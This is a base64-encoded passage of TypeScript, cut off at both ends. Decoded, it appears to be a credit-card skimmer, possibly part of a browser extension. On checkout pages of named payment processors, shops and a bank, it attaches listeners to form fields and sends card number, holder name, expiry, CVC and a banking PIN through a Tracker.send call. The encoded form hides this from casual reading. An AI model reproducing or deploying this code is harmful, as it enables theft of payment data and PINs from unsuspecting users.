dCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZFN0b3JlOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IEhUTUxJbnB1dEVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX3BheXBhbEZvcm1FbGVtZW50LmFjdGlvbi5pbmRleE9mKCdteWFjY291bnQvbW9uZXknKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMF0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiBwYXltZW50TWV0aG9kU3RvcmVbMV0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbMV0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHBheW1lbnRNZXRob2RTdG9yZVsyXS52YWx1ZSA/IHBheW1lbnRNZXRob2RTdG9yZVsyXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kU3RvcmUgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLmhyZWYuaW5kZXhPZignd2ViYXBwcycpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHBheW1lbnRNZXRob2RTdG9yZVsyXS52YWx1ZSA/IHBheW1lbnRNZXRob2RTdG9yZVsyXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jc3MtaXJvMXNzLUljb25Db250YWluZXIuZTd2b3p2ejAnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmZpcnN0RWxlbWVudENoaWxkPy50ZXh0Q29udGVudD8udG9Mb3dlckNhc2UoKSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiAocGF5bWVudE1ldGhvZFN0b3JlWzBdLnZhbHVlID8gcGF5bWVudE1ldGhvZFN0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nKSArICcgJyArIChwYXltZW50TWV0aG9kU3RvcmVbMV0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbMV0udmFsdWUgOiAnVW5rbm93bicpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHBheW1lbnRNZXRob2RTdG9yZVszXS52YWx1ZSA/IHBheW1lbnRNZXRob2RTdG9yZVszXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kU3RvcmVbNF0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbNF0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kU3RvcmUgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9LCAxMDApO1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdmaW5lY29iYW5rJykgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNQSU4nKSAhPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZ09ubHkoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjb25mZXJtYV9lbWFpbF9jZXJ0aWZDb21tYW5kJykgYXMgSFRNTEVsZW1lbnQpLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgX19kZXRlY3RlZEVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVCYW5rQWNjb3VudERhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGF0YVR5cGUnOiAnUElOJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdkYXRhVmFsdWUnOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI1BJTicpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ21vbGxpZScpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcbiAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZU1vbGxpZVBheW1lbnRDb250YWluZXIoc2VsZik7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9LCAxMDApO1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdzdW5kYXknKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTdW5kYXlQYXltZW50Q29udGFpbmVyKHNlbGYpO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSwgMTAwKTtcbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4uaW5kZXhPZignamV0YnJhaW5zJykgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4uaW5kZXhPZignY2hlY2tvdXQnKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xuICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uJykuZm9yRWFjaChmdW5jdGlvbiAoX19idXR0b25FbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fYnV0dG9uRWxlbWVudC5jbGFzc0xpc3QuY29udGFpbnMoJ2J0bkNvbmZpcm1QYXltZW50JykpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2NOdW1iZXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2NOdW1iZXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogLypwYXltZW50TWV0aG9kRGF0YVs2XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzZdLnZhbHVlIDoqLyAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NjSG9sZGVyJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NjSG9sZGVyJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NjRXhwaXJhdGlvbk1vbnRoJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NjRXhwaXJhdGlvbk1vbnRoJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicgKyAnLycgKyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NjRXhwaXJhdGlvblllYXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2NFeHBpcmF0aW9uWWVhcicpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjY1NlY3VyaXR5Q29kZScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjY1NlY3VyaXR5Q29kZScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ3BheWdhdGUnKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXlnYXRlUGF5bWVudENvbnRhaW5lcihzZWxmKTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ2RvY21vcnJpcycpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcbiAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZURvY21vcnJpc1BheW1lbnRDb250YWluZXIoc2VsZik7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9LCAxMDApO1xuICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdzZWdwYXknKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTZWdQYXlQYXltZW50Q29udGFpbmVyKHNlbGYpO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSwgMTAwKTtcbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4uaW5kZXhPZignY2NiaWxsJykgIT09IC0xKSB7XG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNwdXJjaGFzZUZvcm0nKSAhPT0gbnVsbCAmJiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcucGF5X2J5JykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI3BsYWNlT3JkZXInKSBhcyBIVE1MQW5jaG9yRWxlbWVudCkuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy53YWxsZXRfcGF5bWVudF9vcHRpb25zLnR3by1jb2x1bW4tbGF5b3V0LXdhbGxldC1wYXltZW50LW9wdGlvbnMnKT8ucmVtb3ZlKCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NyZWRpdENhcmROdW0nKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY3JlZGl0Q2FyZE51bScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAvKnBheW1lbnRNZXRob2REYXRhWzJdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUudG9Mb3dlckNhc2UoKSA6Ki8gJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNmaXJzdE5hbWUnKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjZmlyc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicgKyAnICcgKyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2xhc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgIT09IG51bGwgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2xhc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NhcmRFeHBpcmF0aW9uTW9udGgnKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2FyZEV4cGlyYXRpb25Nb250aCcpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nICsgJy8nICsgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjYXJkRXhwaXJhdGlvblllYXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2FyZEV4cGlyYXRpb25ZZWFyJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2N2djInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY3Z2MicpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vZWxlbWVudHMgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ29wcHdhLmNvbScpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcbiAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmICgoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZm9ybScpIGFzIEhUTUxGb3JtRWxlbWVudCkuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdmb3JtJykgYXMgSFRNTEZvcm1FbGVtZW50KS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09ICdpbnB1dCcgJiYgKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxJbnB1dEVsZW1lbnQpLnR5cGUgPT09ICd0ZWwnKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2tleXVwJywgJ2tleWRvd24nLCAnY2hhbmdlJywgJ3Bhc3RlJ10uZm9yRWFjaChmdW5jdGlvbiAoX19ldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19jaGlsZEVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcihfX2V2ZW50LCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MSW5wdXRFbGVtZW50KS5nZXRBdHRyaWJ1dGUoJ2FyaWEtbGFiZWwnKSA9PT0gJ0NhcmQgTnVtYmVyJyA/IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAvKnBheW1lbnRNZXRob2REYXRhWzJdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUudG9Mb3dlckNhc